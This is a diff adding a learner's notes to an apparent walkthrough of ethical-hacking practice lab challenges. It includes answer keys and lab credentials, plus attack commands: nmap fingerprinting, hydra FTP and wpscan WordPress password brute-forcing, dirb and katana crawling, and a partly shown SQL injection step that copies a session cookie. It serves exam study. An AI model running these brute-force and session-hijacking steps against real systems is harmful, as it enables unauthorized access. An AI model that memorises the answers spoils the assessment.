@@ -367,7 +367,9 @@ Answer: Content Security Policy
 
 **Challenge** 11:
 You are part of a cybersecurity team investigating an internal website that has been copied from a legitimate site without authorization. One of your teammates, acting as a spy, has scanned the website using a smart scanner within the subnet 192.168.10.0/24. Your task is to identify the number of Directory Listing of Sensitive Files on this website. The report, named w_report.pdf, is available on the target machine.(Hint: He remembered the OS as Windows Server 19 while scanning the website) (Format: NN)
+
 - Use nmap to find Windows server 2019 inside 192.168.10.0/24 and brutefore that ip
+***nmap for OS fingerprinting -A  (sudo nmap -T5 -A ip)
 - hydra -L user.txt -P rockyou.txt 192.168.10.144 ftp
 - username: Parker and Password: Passw0rd@1234
 - Access ftp and get w_report.txt
@@ -380,8 +382,20 @@ Answer: 36
 
 **Challenge** 12:
 Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)
+
+***tried to spider/crawl but could not organically get the wp-login.php landing) but the followingg are just good notes***
+you can "dirb http://www.cehorg.com:8080" (:8080 is just common knowledge)
+check for other wordlists* - ls /usr/share/wordlists/
+****Katana directions: 
+sudo apt update
+sudo apt install golang-go -y
+go install github.com/projectdiscovery/katana/cmd/katana@latest
+export PATH=$PATH:$(go env GOPATH)/bin
+katana -u http://www.cehorg.com:8080 -d 3
+
 - wpscan --url http://www.cehorg.com:8080/CEH/wp-login.php -U adam -P password.txt
-- use password list in desktop
+(wp-login.php is just common knowledge)
+- use password list in desktop *****
 
 Answer: orange1234
 
@@ -392,7 +406,7 @@ As a cybersecurity analyst, your task is to identify potential vulnerabilities o
 
 Answer: 3
 
-**Challenge** 14:
+**Challenge** 14: (we are here)
 Perform a SQL Injection attack on www.moviescope.com and find out the number of users available in the database. (Format: N)
 - Use credentials found in **Challenge** 2 to login.
 - Copy the cookie value of user session lee in inspect element console, type document.cookie
